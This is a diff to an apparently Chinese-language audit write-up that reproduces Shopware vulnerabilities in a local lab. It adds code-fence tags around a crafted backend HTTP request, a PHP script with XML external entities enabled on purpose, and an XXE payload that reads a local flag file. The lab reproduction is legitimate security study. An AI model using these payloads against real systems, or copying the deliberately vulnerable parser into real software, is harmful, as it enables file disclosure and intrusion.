@@ -142,7 +142,7 @@ class ReflectionHelper
 
 登陆后台, 利用路径为 Items --> Product streams --> Add condition stream --> sorting 设置为 Lowest price --> Refresh preview
 
-```
+```http
 GET /backend/ProductStream/loadPreview?_dc=1774841992758&sort=%7B%22Shopware%5C%5CBundle%5C%5CSearchBundle%5C%5CSorting%5C%5CPriceSorting%22%3A%7B%22direction%22%3A%22ASC%22%7D%7D&conditions=%7B%7D&shopId=1&currencyId=1&customerGroupKey=EK&page=1&start=0&limit=25 HTTP/1.1
 Host: shopware.audit
 X-CSRF-Token: 4N5WgdP8TheXwNrjafIt6qO3cBXfFa
@@ -176,7 +176,7 @@ Connection: keep-alive
 
 将脚本放置在 Web 目录("D:\Applications\phpstudy_pro\WWW\shopware.audit\xxe_test.php")
 
-```
+```php
 <?php
 // 模拟 Shopware 5.3.3 之前的脆弱环境配置
 // 注意：在 libxml 2.9.0+ 中，默认是禁用的，为了复现需要手动开启
@@ -213,14 +213,17 @@ try {
 
 建立一个 test_payload.http文件
 
-```
+```http
+POST http://shopware.audit/xxe_test.php
+Content-Type: application/xml
+
 <?xml version="1.0" encoding="utf-8"?>
 <!DOCTYPE root [
-  <!ENTITY xxe SYSTEM "file:///D:/Applications/phpstudy_pro/WWW/flag.txt">
-]>
+        <!ENTITY xxe SYSTEM "file:///D:/Applications/phpstudy_pro/WWW/flag.txt">
+        ]>
 <root>
-  <name>test</name>
-  <content>&xxe;</content>
+    <name>test</name>
+    <content>&xxe;</content>
 </root>
 ```
 
